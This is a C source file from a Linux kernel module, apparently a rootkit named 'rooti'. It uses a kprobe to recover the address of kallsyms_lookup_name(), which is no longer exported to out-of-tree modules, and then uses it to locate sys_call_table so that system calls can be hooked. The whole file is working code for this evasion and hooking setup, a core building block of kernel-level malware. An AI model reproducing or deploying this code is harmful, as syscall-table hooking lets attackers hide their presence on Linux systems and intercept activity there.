#include <linux/kprobes.h>
#include "utils.h"      // Contains the pointer to kallsyms_lookup_name()
#include "syscall.h"    // Contains the pointer to sys_call_table
#include "init.h"

/* 
    Since kernel version 5.7.7 - kallsyms_lookup_name() is no longer exported to out-of-tree modules.
    We can work around this by probing the kallsyms_lookup_name() function with kernel probes.
    One of the things that probing a function gives us is its address in kernel memory.
*/
static unsigned long rooti_resolve_kln_addr(void)
{
    struct kprobe kp;
    unsigned long addr;

    memset(&kp, 0, sizeof(struct kprobe));
    kp.symbol_name = "kallsyms_lookup_name";

    int ret = register_kprobe(&kp);
    if (ret < 0) {
        return 0;
    }

    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

/*
    Some initialization of local data structures that make kernel hooking possible.
    This function is to be called once at the beginning of the program, before installing any hooks.
*/
int rooti_hooking_init()
{
    // Resolve the address of kallsyms_lookup_name()
    __kallsyms_lookup_name = (unsigned long (*)(const char *name))rooti_resolve_kln_addr();
    if (__kallsyms_lookup_name == NULL) {
        printk(KERN_DEBUG "rooti: rooti_resolve_kln_addr() failed: the symbol could not be found\n");
        return -EINVAL;
    }

    __sys_call_table = (unsigned long *)__kallsyms_lookup_name("sys_call_table");
    if (__sys_call_table == NULL) {
        printk(KERN_DEBUG "rooti: could not resolve the address of sys_call_table\n");
        return -EINVAL;
    }

    return 0;
}